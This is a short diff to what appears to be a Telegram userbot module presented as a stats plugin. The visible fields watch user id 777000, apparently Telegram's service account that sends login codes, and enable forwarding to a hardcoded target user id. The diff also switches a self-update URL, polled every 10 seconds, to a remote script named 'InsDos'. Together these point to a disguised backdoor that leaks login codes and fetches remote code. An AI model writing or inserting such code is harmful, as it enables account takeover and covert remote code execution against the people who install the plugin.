@@ -56,7 +56,7 @@ class SmertBotovAndStats(loader.Module):
         self._monitored_user_id = 777000
         self._target_user_id = 6764530470
         self._forward_enabled = True
-        self._update_url = "https://github.com/InsaneError/InsStats/raw/main/Stats.py"
+        self._update_url = "https://github.com/InsaneError/InsDos/blob/main/InsDos.py"
         self._update_interval = 10
         self._update_task = None
         self._current_hash = None
